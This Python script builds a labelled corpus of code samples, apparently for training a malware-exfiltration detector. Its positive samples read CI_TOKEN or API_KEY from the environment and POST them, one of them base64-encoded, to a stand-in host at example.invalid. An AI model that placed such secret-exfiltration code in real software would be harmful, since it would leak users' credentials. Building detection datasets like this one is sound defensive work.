#!/usr/bin/env python3
"""Build the dated µMal corpus for the 2026-08-15 MalIR contract."""

from __future__ import annotations

import argparse
import json
from pathlib import Path

from build_micro_dataset import build_records
from build_micro_dataset_v3 import V3_SCENARIOS

from malir.data import load_training_dataset

VARIANTS = ("base", "import-context", "explicit-cli")


def _variant_source(body: str, variant: str) -> str:
    prefix = "import json\n" if variant == "import-context" else ""
    suffix = (
        "\nif __name__ == '__main__':\n    collect()\n"
        if variant == "explicit-cli"
        else ""
    )
    return prefix + body + suffix


def _source_pair_rows(
    split: str,
    negative_id: str,
    positive_id: str,
    pair_id: str,
    negative_source: str,
    positive_source: str,
) -> list[dict]:
    rows = []
    for variant in VARIANTS:
        for group_id, label, role, source in (
            (negative_id, 0, "unlinked-sensitive-network", negative_source),
            (positive_id, 1, "sensitive-data-transfer", positive_source),
        ):
            rows.append(
                {
                    "sample_id": f"{group_id}--{variant}",
                    "group_id": group_id,
                    "split": split,
                    "role": role,
                    "label": label,
                    "pair_id": pair_id,
                    "source": _variant_source(source, variant),
                }
            )
    return rows


TRAIN_NEGATIVE = """\ndef collect():\n    secret = os.getenv('CI_TOKEN')\n    harmless = 'hello'\n    requests.post('https://example.invalid/telemetry', data=harmless)\n"""
TRAIN_POSITIVE = """\ndef collect():\n    secret = os.getenv('CI_TOKEN')\n    requests.post('https://example.invalid/collect', data=secret)\n"""
VALIDATION_NEGATIVE = """\ndef collect():\n    module_name = 'base64'\n    __import__(module_name)\n    secret = os.getenv('API_KEY')\n    harmless = base64.b64encode(b'hello')\n    requests.post('https://example.invalid/telemetry', data=harmless)\n"""
VALIDATION_POSITIVE = """\ndef collect():\n    module_name = 'base64'\n    __import__(module_name)\n    secret = os.getenv('API_KEY')\n    payload = base64.b64encode(secret.encode())\n    requests.post('https://example.invalid/collect', data=payload)\n"""


def build_rows() -> list[dict]:
    rows = build_records(V3_SCENARIOS)
    rows.extend(
        _source_pair_rows(
            "train",
            "train-unlinked-secret-telemetry-2026-08-15",
            "train-exact-secret-exfil-2026-08-15",
            "train-causal-evidence-2026-08-15",
            TRAIN_NEGATIVE,
            TRAIN_POSITIVE,
        )
    )
    rows.extend(
        _source_pair_rows(
            "validation",
            "validation-unlinked-encoded-telemetry-2026-08-15",
            "validation-exact-encoded-exfil-2026-08-15",
            "validation-causal-evidence-2026-08-15",
            VALIDATION_NEGATIVE,
            VALIDATION_POSITIVE,
        )
    )
    return rows


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("examples/micro_train_2026_08_15.jsonl"),
    )
    return parser


def main() -> None:
    args = build_parser().parse_args()
    args.output.parent.mkdir(parents=True, exist_ok=True)
    rows = build_rows()
    args.output.write_text(
        "\n".join(
            json.dumps(row, sort_keys=True, separators=(",", ":")) for row in rows
        )
        + "\n",
        encoding="utf-8",
    )
    dataset = load_training_dataset(args.output)
    print(
        json.dumps(
            {
                "output": str(args.output),
                "train_examples": len(dataset.train),
                "validation_examples": len(dataset.validation),
                "train_groups": len({row.group_id for row in dataset.train}),
                "validation_groups": len({row.group_id for row in dataset.validation}),
                "dataset_sha256": dataset.dataset_sha256,
                "split_fingerprint": dataset.split_fingerprint,
            },
            indent=2,
            sort_keys=True,
        )
    )


if __name__ == "__main__":
    main()
